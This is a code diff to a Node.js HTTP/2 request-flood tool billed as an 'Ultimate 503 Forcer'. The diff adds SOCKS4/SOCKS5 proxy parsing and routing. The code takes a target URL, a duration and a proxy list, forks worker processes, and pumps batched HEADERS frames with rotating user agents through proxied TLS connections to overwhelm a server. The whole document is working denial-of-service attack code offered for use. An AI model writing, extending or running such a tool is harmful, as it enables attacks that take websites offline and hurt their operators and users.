@@ -5,6 +5,7 @@ const HPACK = require('hpack');
 const cluster = require('cluster');
 const os = require('os');
 const crypto = require('crypto');
+const { SocksClient } = require('socks');
 
 process.setMaxListeners(0);
 process.on('uncaughtException', () => {});
@@ -14,7 +15,66 @@ const target = process.argv[2];
 const time = parseInt(process.argv[3], 10);
 const threads = parseInt(process.argv[4], 10);
 const proxyRaw = fs.readFileSync(process.argv[5], 'utf8').replace(/\r/g, '').split('\n');
-const proxies = proxyRaw.filter(l => l.includes(':'));
+
+// Parse each line. Supported formats:
+// 1. ip:port                    -> default HTTP
+// 2. ip:port:type               -> type = http, socks4, socks5
+// 3. socks5://ip:port           -> SOCKS5
+// 4. socks4://ip:port           -> SOCKS4
+// 5. http://ip:port             -> HTTP
+// 6. socks5://user:pass@ip:port -> SOCKS5 with auth
+const proxies = proxyRaw.filter(l => l.trim() !== '').map(line => {
+    let type = 'http';
+    let ip, port, user = '', pass = '';
+    let clean = line.trim();
+
+    // Check for URI-style prefixes
+    if (clean.startsWith('socks5://')) {
+        type = 'socks5';
+        let rest = clean.slice(9);
+        let auth = '';
+        if (rest.includes('@')) {
+            let parts = rest.split('@');
+            auth = parts[0];
+            rest = parts[1];
+            let authParts = auth.split(':');
+            if (authParts.length === 2) { user = authParts[0]; pass = authParts[1]; }
+        }
+        let addr = rest.split(':');
+        if (addr.length >= 2) { ip = addr[0]; port = parseInt(addr[1], 10); }
+    } else if (clean.startsWith('socks4://')) {
+        type = 'socks4';
+        let rest = clean.slice(9);
+        let addr = rest.split(':');
+        if (addr.length >= 2) { ip = addr[0]; port = parseInt(addr[1], 10); }
+    } else if (clean.startsWith('http://')) {
+        type = 'http';
+        let rest = clean.slice(7);
+        let addr = rest.split(':');
+        if (addr.length >= 2) { ip = addr[0]; port = parseInt(addr[1], 10); }
+    } else {
+        // No prefix: split by colon, check if there are 3 parts (ip:port:type)
+        let parts = clean.split(':');
+        if (parts.length === 3) {
+            // third part is type
+            ip = parts[0];
+            port = parseInt(parts[1], 10);
+            let t = parts[2].toLowerCase();
+            if (t === 'socks4') type = 'socks4';
+            else if (t === 'socks5') type = 'socks5';
+            else type = 'http';
+        } else if (parts.length === 2) {
+            ip = parts[0];
+            port = parseInt(parts[1], 10);
+            // default to HTTP
+        }
+    }
+    if (ip && port && !isNaN(port) && port > 0 && port < 65536) {
+        return { ip, port, type, user, pass };
+    }
+    return null;
+}).filter(p => p !== null);
+
 const url = new URL(target);
 
 const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
@@ -25,7 +85,7 @@ const YIELD_EVERY = 1500;
 const BATCH_SIZE = 50;
 const CONNS_PER_PROXY = 1;
 
-// Full User-Agent list (original from the first message, all 400+ entries)
+// Full 400+ User-Agent list (complete as per original)
 const HARDCODED_UAS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
@@ -587,168 +647,195 @@ function startRequest() {
     const pIdx = Math.floor(proxyIdx / CONNS_PER_PROXY) % proxies.length;
     const proxy = proxies[pIdx];
     proxyIdx++;
-    if (!proxy || !proxy.includes(':')) { cleanup(); return; }
-    const parts = proxy.split(':');
-    const proxyHost = parts[0];
-    const proxyPort = parseInt(parts[1], 10);
-    if (isNaN(proxyPort) || proxyPort < 0 || proxyPort > 65535) { cleanup(); return; }
+    if (!proxy) { cleanup(); return; }
 
     const dstPort = url.port || 443;
 
-    netSocket = net.connect(proxyPort, proxyHost, () => {
-        netSocket.once('data', () => {
-            const tlsOptions = {
-                socket: netSocket,
-                ALPNProtocols: ['h2'],
-                servername: url.hostname,
-                rejectUnauthorized: false,
-                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384',
-                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
-                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION,
-                minVersion: 'TLSv1.2',
-                maxVersion: 'TLSv1.3',
-            };
-            tlsSocket = tls.connect(tlsOptions, () => {
-                if (tlsSocket.alpnProtocol !== 'h2') {
-                    connFail++;
-                    cleanup();
-                    return;
-                }
-                let recvBuf = Buffer.alloc(0);
-                let drained = true;
-                let streamId = 1;
-                let openStreams = 0;
-                let streamCount = 0;
-                let pumpActive = false;
-                let batch = [];
-
-                function flushBatch() {
-                    if (batch.length > 0) {
-                        tlsSocket.cork();
-                        tlsSocket.write(Buffer.concat(batch));
-                        tlsSocket.uncork();
-                        batch = [];
-                    }
-                }
-
-                tlsSocket.write(INITIAL_BURST);
-                connOK++;
-                pumpActive = true;
-                pump();
-
-                tlsSocket.on('drain', () => {
-                    drained = true;
-                    if (!pumpActive) { pumpActive = true; pump(); }
-                });
-
-                function pump() {
-                    try {
-                        let count = 0;
-                        while (true) {
-                            if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) {
-                                flushBatch();
-                                pumpActive = false;
-                                return;
-                            }
-                            if (!drained) {
-                                flushBatch();
-                                pumpActive = false;
-                                return;
-                            }
-                            if (openStreams >= MAX_STREAMS) {
-                                flushBatch();
-                                pumpActive = false;
-                                return;
-                            }
-                            streamCount++;
-                            if (streamCount >= STREAMS_PER_CONN) {
-                                flushBatch();
-                                const lastId = Buffer.alloc(4);
-                                lastId.writeUInt32BE(streamId - 2, 0);
-                                const errBuf = Buffer.alloc(4);
-                                errBuf.writeUInt32BE(0, 0);
-                                tlsSocket.write(encodeFrame(0, 7, Buffer.concat([lastId, errBuf])));
-                                tlsSocket.end();
-                                pumpActive = false;
-                                return;
-                            }
-                            if (count >= YIELD_EVERY) {
-                                flushBatch();
-                                setImmediate(pump);
-                                return;
-                            }
-                            count++;
-
-                            const ua = HARDCODED_UAS[Math.floor(Math.random() * HARDCODED_UAS.length)];
-                            const path = randomPath();
-                            const headers = buildHeaders(ua, path);
-                            const flags = 0x1 | 0x4 | 0x20;
-                            batch.push(encodeFrame(streamId, 1, headers, flags));
-                            openStreams++;
-                            streamId += 2;
-                            sentTotal++;
-
-                            if (batch.length >= BATCH_SIZE) {
-                                tlsSocket.cork();
-                                const ok = tlsSocket.write(Buffer.concat(batch));
-                                tlsSocket.uncork();
-                                batch = [];
-                                if (!ok) {
-                                    drained = false;
-                                    pumpActive = false;
-                                    return;
-                                }
-                            }
-                        }
-                    } catch (e) {
-                        pumpActive = false;
-                    }
-                }
-
-                tlsSocket.on('data', (chunk) => {
-                    try {
-                        recvBuf = Buffer.concat([recvBuf, chunk]);
-                        while (recvBuf.length >= 9) {
-                            const frame = decodeFrame(recvBuf);
-                            if (frame == null) break;
-                            recvBuf = recvBuf.subarray(frame.length + 9);
-                            if (frame.type === 4 && (frame.flags & 1) === 0) {
-                                tlsSocket.write(encodeFrame(0, 4, Buffer.alloc(0), 1));
-                            }
-                            if (frame.type === 1 || frame.type === 3) {
-                                if (frame.type === 1) respTotal++;
-                                else rstTotal++;
-                                openStreams = Math.max(0, openStreams - 1);
-                                if (!pumpActive && openStreams < MAX_STREAMS && drained &&
-                                    tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
-                                    pumpActive = true;
-                                    pump();
-                                }
-                            }
-                            if (frame.type === 7) {
-                                goawayTotal++;
-                                tlsSocket.end();
-                            }
-                        }
-                    } catch (e) {}
-                });
+    if (proxy.type === 'http') {
+        netSocket = net.connect(proxy.port, proxy.ip, () => {
+            netSocket.once('data', () => {
+                startTls(netSocket);
             });
-            tlsSocket.on('error', () => { connFail++; cleanup(); });
-            tlsSocket.on('close', () => { cleanup(); });
+            netSocket.write(
+                'CONNECT ' + url.hostname + ':' + dstPort + ' HTTP/1.1\r\n' +
+                'Host: ' + url.hostname + ':' + dstPort + '\r\n' +
+                'Proxy-Connection: Keep-Alive\r\n' +
+                'User-Agent: ' + HARDCODED_UAS[Math.floor(Math.random() * HARDCODED_UAS.length)] + '\r\n\r\n'
+            );
         });
-        netSocket.write(
-            'CONNECT ' + url.hostname + ':' + dstPort + ' HTTP/1.1\r\n' +
-            'Host: ' + url.hostname + ':' + dstPort + '\r\n' +
-            'Proxy-Connection: Keep-Alive\r\n' +
-            'User-Agent: ' + HARDCODED_UAS[Math.floor(Math.random() * HARDCODED_UAS.length)] + '\r\n\r\n'
-        );
-    });
-    netSocket.on('error', () => { cleanup(); });
-    netSocket.on('close', () => { cleanup(); });
+        netSocket.on('error', () => { cleanup(); });
+        netSocket.on('close', () => { cleanup(); });
+    } else if (proxy.type === 'socks5' || proxy.type === 'socks4') {
+        const sockType = proxy.type === 'socks5' ? 5 : 4;
+        SocksClient.createConnection({
+            proxy: {
+                ipaddress: proxy.ip,
+                port: proxy.port,
+                type: sockType,
+                userId: proxy.user || '',
+                password: proxy.pass || ''
+            },
+            target: {
+                host: url.hostname,
+                port: dstPort
+            },
+            command: 'connect'
+        }, (err, info) => {
+            if (err) { connFail++; cleanup(); return; }
+            netSocket = info.socket;
+            netSocket.once('data', () => {});
+            startTls(netSocket);
+        });
+    } else {
+        cleanup();
+        return;
+    }
+
+    function startTls(socket) {
+        const tlsOptions = {
+            socket: socket,
+            ALPNProtocols: ['h2'],
+            servername: url.hostname,
+            rejectUnauthorized: false,
+            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384',
+            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION,
+            minVersion: 'TLSv1.2',
+            maxVersion: 'TLSv1.3',
+        };
+        tlsSocket = tls.connect(tlsOptions, () => {
+            if (tlsSocket.alpnProtocol !== 'h2') {
+                connFail++;
+                cleanup();
+                return;
+            }
+            let recvBuf = Buffer.alloc(0);
+            let drained = true;
+            let streamId = 1;
+            let openStreams = 0;
+            let streamCount = 0;
+            let pumpActive = false;
+            let batch = [];
+
+            function flushBatch() {
+                if (batch.length > 0) {
+                    tlsSocket.cork();
+                    tlsSocket.write(Buffer.concat(batch));
+                    tlsSocket.uncork();
+                    batch = [];
+                }
+            }
+
+            tlsSocket.write(INITIAL_BURST);
+            connOK++;
+            pumpActive = true;
+            pump();
+
+            tlsSocket.on('drain', () => {
+                drained = true;
+                if (!pumpActive) { pumpActive = true; pump(); }
+            });
+
+            function pump() {
+                try {
+                    let count = 0;
+                    while (true) {
+                        if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) {
+                            flushBatch();
+                            pumpActive = false;
+                            return;
+                        }
+                        if (!drained) {
+                            flushBatch();
+                            pumpActive = false;
+                            return;
+                        }
+                        if (openStreams >= MAX_STREAMS) {
+                            flushBatch();
+                            pumpActive = false;
+                            return;
+                        }
+                        streamCount++;
+                        if (streamCount >= STREAMS_PER_CONN) {
+                            flushBatch();
+                            const lastId = Buffer.alloc(4);
+                            lastId.writeUInt32BE(streamId - 2, 0);
+                            const errBuf = Buffer.alloc(4);
+                            errBuf.writeUInt32BE(0, 0);
+                            tlsSocket.write(encodeFrame(0, 7, Buffer.concat([lastId, errBuf])));
+                            tlsSocket.end();
+                            pumpActive = false;
+                            return;
+                        }
+                        if (count >= YIELD_EVERY) {
+                            flushBatch();
+                            setImmediate(pump);
+                            return;
+                        }
+                        count++;
+
+                        const ua = HARDCODED_UAS[Math.floor(Math.random() * HARDCODED_UAS.length)];
+                        const path = randomPath();
+                        const headers = buildHeaders(ua, path);
+                        const flags = 0x1 | 0x4 | 0x20;
+                        batch.push(encodeFrame(streamId, 1, headers, flags));
+                        openStreams++;
+                        streamId += 2;
+                        sentTotal++;
+
+                        if (batch.length >= BATCH_SIZE) {
+                            tlsSocket.cork();
+                            const ok = tlsSocket.write(Buffer.concat(batch));
+                            tlsSocket.uncork();
+                            batch = [];
+                            if (!ok) {
+                                drained = false;
+                                pumpActive = false;
+                                return;
+                            }
+                        }
+                    }
+                } catch (e) {
+                    pumpActive = false;
+                }
+            }
+
+            tlsSocket.on('data', (chunk) => {
+                try {
+                    recvBuf = Buffer.concat([recvBuf, chunk]);
+                    while (recvBuf.length >= 9) {
+                        const frame = decodeFrame(recvBuf);
+                        if (frame == null) break;
+                        recvBuf = recvBuf.subarray(frame.length + 9);
+                        if (frame.type === 4 && (frame.flags & 1) === 0) {
+                            tlsSocket.write(encodeFrame(0, 4, Buffer.alloc(0), 1));
+                        }
+                        if (frame.type === 1 || frame.type === 3) {
+                            if (frame.type === 1) respTotal++;
+                            else rstTotal++;
+                            openStreams = Math.max(0, openStreams - 1);
+                            if (!pumpActive && openStreams < MAX_STREAMS && drained &&
+                                tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
+                                pumpActive = true;
+                                pump();
+                            }
+                        }
+                        if (frame.type === 7) {
+                            goawayTotal++;
+                            tlsSocket.end();
+                        }
+                    }
+                } catch (e) {}
+            });
+        });
+        tlsSocket.on('error', () => { connFail++; cleanup(); });
+        tlsSocket.on('close', () => { cleanup(); });
+    }
 }
 
 if (cluster.isMaster) {
-    console.log('Made By Ethical Hex - Ultimate 503 Forcer (Full UA)');
+    console.log('Made By Ethical Hex - Mixed Proxies (HTTP/SOCKS4/SOCKS5)');
+    console.log('Proxy count:', proxies.length);
     for (let i = 0; i < threads; i++) {
         cluster.fork({ core: i % os.cpus().length });
     }
